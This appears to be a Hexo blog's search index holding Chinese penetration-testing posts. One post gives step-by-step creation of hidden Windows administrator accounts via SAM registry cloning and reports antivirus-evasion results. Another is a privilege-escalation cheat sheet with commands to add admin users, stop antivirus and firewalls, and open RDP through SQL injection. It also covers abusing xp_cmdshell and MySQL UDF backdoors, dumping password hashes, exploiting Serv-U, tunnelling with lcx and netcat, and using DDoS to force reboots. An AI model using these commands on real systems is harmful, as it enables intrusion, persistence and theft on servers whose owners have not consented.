<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>windows一键创建隐藏账户</title>
    <url>/%E4%B8%80%E9%94%AE%E5%88%9B%E5%BB%BA%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7/</url>
    <content><![CDATA[<h1 id="手动创建"><a href="#手动创建" class="headerlink" title="手动创建"></a>手动创建</h1><h2 id="方法一：添加-符"><a href="#方法一：添加-符" class="headerlink" title="方法一：添加 $ 符"></a>方法一：添加 $ 符</h2><p>添加隐藏用户并添加到管理员组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user teamssix$ Passw0rd /addnet localgroup administrators teamssix$ /add</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/640" alt="图片"></p>
<p>在使用 net user 查看当前用户时，是看不到这个用户的，但是在控制面板里可以看到该用户</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444359.png" alt="图片"></p>
<p>使用 wmic 也能看到该用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic useraccount get Name</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444622.png" alt="图片"></p>
<p>删除该用户直接用 net user 即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user teamssix$ /del</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444393.png" alt="图片"></p>
<h2 id="方法二：修改注册表"><a href="#方法二：修改注册表" class="headerlink" title="方法二：修改注册表"></a>方法二：修改注册表</h2><p>打开注册表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SAM\SAM\</span><br></pre></td></tr></table></figure>

<p>赋予管理员用户完全控制的权限</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444797.png" alt="图片"></p>
<p>关闭注册表，再次来到刚才的路径，这时就可以看到 SAM 文件夹里的内容了</p>
<p>这时需要导出三个文件：</p>
<ul>
<li>Users 下的管理员文件</li>
<li>Users 下的隐藏账号文件</li>
<li>Names 下的隐藏账号文件</li>
</ul>
<p>Users 下的文件名可能不太好判断归属那个用户，不过在选择 Names 下的用户时，可以看到相应的类型值，比如 teamssix$ 账号对应的是 0x3ea，那么 Users 下的文件夹就是 000003EA，同理找到管理员 Administrator 对应的是 00001F4</p>
<p>找到这三个文件后，右击选择导出</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444200.png" alt="图片"></p>
<p>使用记事本打开导出的 Users 下的两个文件，将 Administrator 中的 F 键值内容进行替换到 teamssix$ 中</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444887.png" alt="图片"></p>
<p>然后删除 teamssix$ 用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user teamssix$ /del</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444419.png" alt="图片"></p>
<p>这个时候其实 teamssix$ 用户就被删掉了，然后利用刚才的注册表文件再添加上 teamssix$ 用户</p>
<p>双击刚才导出的 Users 下的 teamssix$ 文件和 Names 下的 teamssix$ 文件。</p>
<p>此时，利用注册表新建隐藏账号就做好了，不管是 net user 还是控制面板都看不到该用户。</p>
<p>使用 net user teamssix$ 能看到该用户，说明该用户是存在的。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444095.png" alt="图片"></p>
<p>从上面图片可以看到其实账号是禁用的状态，因此想使用这个账号，还得给它启用才行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net user teamssix$ /active:yes</span><br></pre></td></tr></table></figure>

<p>如果想删除这个账号，在注册表中删除 Users 下的 000003EA 和 Names 下的 teamssix$ 就行了。</p>
<p>不过这种方法依然是有破绽的，比如在注册表里还是能发现 teamssix$ 用户的，使用 wmic 也能看到该用户。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444277.png" alt="图片"></p>
<p>而且当电脑重启后，在计算机管理里也能看到刚刚创建的隐藏账号。</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444740.png" alt="图片"></p>
<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>对比了下两种方法，虽然都有办法去发现隐藏账号，但是第二种修改注册表的方法很明显隐藏性还是更好些，只是操作起来有些麻烦，但是又没有什么用着顺手的工具，所以这里自己写了一个利用注册表添加隐藏账号的小工具。</p>
<p>工具地址：<a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444634.png" alt="图片"></p>
<p>命令帮助信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-c 检查当前系统的隐藏账户 -d 指定要删除的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $ -p 指定添加的用户的密码 -u 指定要添加的用户名，如果添加的用户名不是以 $ 结尾，则工具会自动在用户名后添加上 $</span><br></pre></td></tr></table></figure>

<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>例如这里添加一个用户名为 teamssix 的隐藏账号，工具会自动在用户名后添加 $ 符，因此创建后的用户名为 teamssix$</p>
<p>使用的时候，记得在管理员权限下运行，不然会提示权限不足</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateHiddenAccount.exe -u teamssix -p Passw0rd</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141444927.png" alt="图片"></p>
<p>创建完后，通过 net user 和控制面板等等都是看不到这个账号的</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141445869.png" alt="图片"></p>
<p>检查当前系统的隐藏账号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateHiddenAccount.exe -c</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141445731.png" alt="图片"></p>
<p>删除 teamssix 隐藏账号，当删除完账号后，再次检查当前系统的隐藏账号，可以看到就提示没有隐藏账号了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CreateHiddenAccount.exe -d teamssix</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141445568.png" alt="图片"></p>
<h2 id="免杀能力"><a href="#免杀能力" class="headerlink" title="免杀能力"></a>免杀能力</h2><p>因为在工具里是利用 Windows API 创建的用户，所以天然具有一定的免杀能力，不过因为工具里需要对注册表进行操作，所以还是会被杀软发现。</p>
<p>我这里用 360 和火绒测试了下免杀的能力，情况大体如下：</p>
<p><img src="https://raw.githubusercontent.com/3034930596/pic/main/img/202207141445802.png" alt="图片"></p>
<p>整体上，除了在添加用户的时候，360 会弹窗询问要不要允许修改注册表外，其他时候杀软都是没动静的，个人觉着还行。</p>
<p>不过这个也只是我当时的检测情况，也许明天后天就会被查杀，这个也是很正常的事儿。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>内网提权小笔记</title>
    <url>/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="提权笔记"><a href="#提权笔记" class="headerlink" title="提权笔记"></a>提权笔记</h1><h2 id="web提权"><a href="#web提权" class="headerlink" title="**web提权 **"></a>**web提权 **</h2><ol>
<li><p>能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:windowstempcookiesnet1.exe user</p>
</li>
<li><p>当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
</li>
<li><p>cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe&#x2F;cmd.com&#x2F;cmd.txt 都可以。</p>
</li>
<li><p>cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p>
</li>
<li><p>c:windowstempcookies 这个目录</p>
</li>
<li><p>找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p>
</li>
<li><p>cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括&#x2F;c )输入”net user jianmei daxia &#x2F;add”</p>
</li>
<li><p>增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p>
</li>
<li><p>有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p>
</li>
<li><p>有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p>
</li>
<li><p>其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p>
</li>
<li><p>用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p>
</li>
<li><p>提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p>
</li>
<li><p>当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录<br>然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p>
</li>
<li><p>有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
</li>
<li><p>进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</p>
</li>
<li><p>有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p>
</li>
<li><p>一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p>
</li>
<li><p>执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt &#x2F;c c:windowstempcookiesPwDump7.exe &gt;1.txt</p>
</li>
<li><p>菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe</p>
</li>
<li><p>当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。<br>上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令&#x2F;c “c:windowstempcookiescscript.exe” d:webiispwd.vbs</p>
</li>
<li><p>如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x</p>
</li>
</ol>
<h2 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a><strong>dos命令大全</strong></h2><p>查看版本：ver</p>
<p>查看权限：whoami</p>
<p>查看配置：systeminfo</p>
<p>查看用户：net user</p>
<p>查看进程：tasklist</p>
<p>查看正在运行的服务：tasklist &#x2F;svc</p>
<p>查看开放的所有端口：netstat -ano</p>
<p>查询管理用户名：query user</p>
<p>查看搭建环境：ftp 127.0.0.1</p>
<p>查看指定服务的路径：sc qc Mysql</p>
<p>添加一个用户：net user jianmei daxia.asd &#x2F;add</p>
<p>提升到管理权限：net localgroup administrators jianmei &#x2F;add</p>
<p>添加用户并提升权限：net user jianmei daxia.asd &#x2F;add &amp; net localgroup administrators jianmei &#x2F;add</p>
<p>查看制定用户信息：net user jianmei</p>
<p>查看所有管理权限的用户：net localgroup administrators</p>
<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei &#x2F;add</p>
<p>突破最大连接数：mstsc &#x2F;admin &#x2F;v:127.0.0.1</p>
<p>删除用户：net user jianmei &#x2F;del</p>
<p>删除管理员账户:net user administrator daxia.asd</p>
<p>更改系统登陆密码：net password daxia.asd</p>
<p>激活GUEST用户：net user guest &#x2F;active:yes</p>
<p>开启TELNET服务：net start telnet</p>
<p>关闭麦咖啡：net stop “McAfee McShield”</p>
<p>关闭防火墙：net stop sharedaccess</p>
<p>查看当前目录的所有文件：dir c:windows</p>
<p>查看制定文件的内容：type c:windows1.asp</p>
<p>把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：</p>
<p>copy c:windowstempcookiescmd.exe c:windowstempcmd.txt</p>
<p>开3389端口的命令：</p>
<p>REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
<p>查 看补丁：</p>
<p>dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find &#x2F;i “%i”||@echo %i Not Installed!)&amp;del &#x2F;f &#x2F;q &#x2F;a a.txt</p>
<h3 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a><strong>SQL语句直接开启3389</strong></h3><p>3389登陆关键注册表位置：</p>
<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</p>
<p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p>
<p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p>
<p>开启3389的SQL语句：</p>
<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
<p>关闭3389的SQL语句：</p>
<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a><strong>常见杀软</strong></h2><p>360tray.exe 360实时保护</p>
<p>ZhuDongFangYu.exe 360主动防御</p>
<p>KSafeTray.exe 金山卫士</p>
<p>McAfee McShield.exe 麦咖啡</p>
<p>SafeDogUpdateCenter.exe 服务器安全狗</p>
<h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h2><h3 id="敏感目录-目录权限-提权用途"><a href="#敏感目录-目录权限-提权用途" class="headerlink" title="敏感目录 目录权限 提权用途"></a>敏感目录 目录权限 提权用途</h3><p>C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件<br>C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径<br>C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及exp<br>C:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及exp<br>C:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件<br>C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码<br>C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。<br>C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及exp<br>C:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限<br>C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码<br>C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权<br>C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权<br>C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码<br>c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件<br>C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置<br>C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</p>
<h3 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="提权中的敏感注册表位置"></a><strong>提权中的敏感注册表位置</strong></h3><p>HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口<br>HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启<br>HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置<br>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置<br>HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值<br>HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌<br>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码<br>HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</p>
<h3 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="**wscript.shell的删除和恢复 **"></a>**wscript.shell的删除和恢复 **</h3><p>载wscript.shell对象，在cmd下或直接运行：regsvr32 &#x2F;u %windir%system32WSHom.Ocx</p>
<p>卸载FSO对象，在cmd下或直接运行：regsvr32.exe &#x2F;u %windir%system32scrrun.dll</p>
<p>卸载stream对象，在cmd下或直接运行：regsvr32 &#x2F;s &#x2F;u “C:ProgramFilesCommonFilesSystemadomsado15.dll”</p>
<p>如果想恢复的话只需要去掉&#x2F;U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
<h2 id="如何找到准确的终端连接端口"><a href="#如何找到准确的终端连接端口" class="headerlink" title="如何找到准确的终端连接端口"></a><strong>如何找到准确的终端连接端口</strong></h2><p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口</p>
<p>或是执行命令查看正在运行的服务：tasklist &#x2F;svc</p>
<p>找到：svchost.exe 1688 TermService</p>
<p>记住1688这个ID值，</p>
<p>查看开放的所有端口：netstat -ano</p>
<p>找到1688这个ID值所对应的端口就是3389目前的端口</p>
<h2 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="**iis6提权提示Can not find wmiprvse.exe的突破方法 **"></a>**iis6提权提示Can not find wmiprvse.exe的突破方法 **</h2><p>windows2003   iis6</p>
<p>iis7在windows2008以上</p>
<ul>
<li><p>突破方法一：</p>
<p>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p>
<p>在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</p>
</li>
<li><p>突破方法二：</p>
<p>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p>
<p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
</li>
</ul>
<h2 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="本地溢出提权"></a>本地溢出提权</h2><p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p>
<p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p>
<p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p>
<p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
<h3 id="sa提权-–windows-sqlserver只能用于windows"><a href="#sa提权-–windows-sqlserver只能用于windows" class="headerlink" title="sa提权 –windows sqlserver只能用于windows"></a>sa提权 –windows sqlserver只能用于windows</h3><p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p>
<p>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server&#x3D;localhost;UID&#x3D;sa;PWD&#x3D;;database&#x3D;master;Provider&#x3D;SQLOLEDB–输入帐号密码连接即可</p>
<p>增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd &#x2F;add’;–<br>提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei &#x2F;add’;–</p>
<p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
<h3 id="root提权-–windows-x2F-linux"><a href="#root提权-–windows-x2F-linux" class="headerlink" title="root提权 –windows&#x2F;linux"></a>root提权 –windows&#x2F;linux</h3><p>利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码</p>
<p>如何判断一台windows服务器上的mysql有没有降权？<br>cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p>
<p>如何判断服务器上是否开启了mysql服务？<br>开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p>
<p>如何查看root密码？<br>在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。<br>有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。</p>
<p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p>
<p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p>
<p>注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib&#x2F;plugin目录中</p>
<p>例如：D:&#x2F;Program Files&#x2F;MySQL&#x2F;MySQL Server 5.1&#x2F;lib&#x2F;plugin&#x2F;mysql.dll</p>
<p>如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，<br>1、停止mysql服务<br>2、替换下载下来的3个文件（user.MYI user.MYD user.frm）<br>3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables<br>4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot<br>5、最后查询一下就出来了select user,password from mysql.user;</p>
<h3 id="serv-u提权-–ftp–windows"><a href="#serv-u提权-–ftp–windows" class="headerlink" title="serv-u提权 –ftp–windows"></a>serv-u提权 –ftp–windows</h3><p>这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\ServUDaemon.ini</p>
<p>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword&#x3D;nqFCE64E0056362E8FCAF813094EC39BC2</p>
<p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p>
<p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p>
<p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p>
<p>530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..</p>
<p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p>
<p>目录有修改权限之serv-u提权：</p>
<p>找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！</p>
<p>接着本地cmd命令：ftp 服务器ip</p>
<p>回车，输入帐号密码再回车………………….</p>
<p>接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：</p>
<p>Quote site exec net user jianmei daxia &#x2F;add 增加一个用户</p>
<p>Quote site exec net localgroup administrators jianmei &#x2F;add 提升到管理员权限</p>
<p>200 EXEC command successful (TID&#x3D;33). 执行成功的回显信息</p>
<p>Maintenance&#x3D;System 权限类型多加一行指定新加帐号为系统管理员</p>
<p>ReloadSettings&#x3D;True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</p>
<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>什么情况下适合转发端口？</p>
<p>1.服务器是内网，我们无法连接。<br>2.服务器上有防火墙，阻断我们的连接。</p>
<p>转发端口的前提，我们是外网或是有外网服务器。</p>
<p>找个可读可写目录上传lcx.exe</p>
<p>本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）</p>
<p>接着shell命令：&#x2F;c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）</p>
<p>之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p>
<p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p>
<p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p>
<p>接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
<h2 id="nc反弹提权"><a href="#nc反弹提权" class="headerlink" title="nc反弹提权"></a>nc反弹提权</h2><p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p>
<p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p>
<p>找个可读可写目录上传nc.exe cmd.exe</p>
<p>-l 监听本地入栈信息</p>
<p>-p port打开本地端口</p>
<p>-t 以telnet形式应答入栈请求</p>
